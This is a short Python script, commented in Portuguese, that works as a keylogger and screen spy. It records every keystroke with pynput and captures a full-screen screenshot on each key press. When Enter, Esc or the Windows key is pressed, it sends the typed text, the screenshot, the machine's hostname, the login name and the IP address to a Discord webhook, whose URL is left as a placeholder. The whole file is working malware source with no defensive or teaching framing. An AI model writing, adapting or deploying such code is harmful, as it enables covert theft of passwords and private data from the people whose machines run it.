from pynput.keyboard import Key, Listener
from os import getlogin
from discord_webhook import DiscordWebhook
from socket import getfqdn, gethostbyname
from io import BytesIO
from PIL.ImageGrab import grab
from datetime import datetime
teclas = []
def printe ():
    dwb.add_file (imagem, "screenshot.png")
    dwb.execute()
    teclas.clear()
def pressionado(key):
    screenshot = grab(bbox=None)
    global imagem
    imagem = BytesIO()
    screenshot.save(imagem, format="PNG")
    imagem.seek(0)
    try: teclas.append (key.char)
    except AttributeError:
        if key == Key.space: teclas.append (" ")
        elif key == Key.backspace: 
            if len(teclas) > 0: del teclas[len(teclas) - 1]
        elif key == Key.enter: teclas.append("")
        else: teclas.append (str(key).replace("Key.", "").upper() + " ")
    if key in [Key.enter, Key.esc, Key.cmd]:
        a = 0
        for i in teclas: 
            if i in ["", " "]: a += 1
        if len(teclas) == a:
            global dwb
            dwb = DiscordWebhook (url= "URL DA WEBHOOK", content= f"\n\n_**{getfqdn()}**_ | _**{getlogin()}**_ | _**{gethostbyname(getfqdn())}**_\n{datetime.strftime(datetime.now(), "%d/%m/%Y - %H:%M:%S")}\n```[Nenhuma tecla digitada.]```")
            printe()
        else:
            try:
                dwb = DiscordWebhook (url= "URL DA WEBHOOK", content= f"\n\n_**{getfqdn()}**_ | _**{getlogin()}**_ | _**{gethostbyname(getfqdn())}**_\n{datetime.strftime(datetime.now(), "%d/%m/%Y - %H:%M:%S")}\n```{"".join(teclas)}```")
                printe()
            except Exception as x: print ("Erro: ", x)
with Listener (on_press= pressionado) as observador: observador.join()
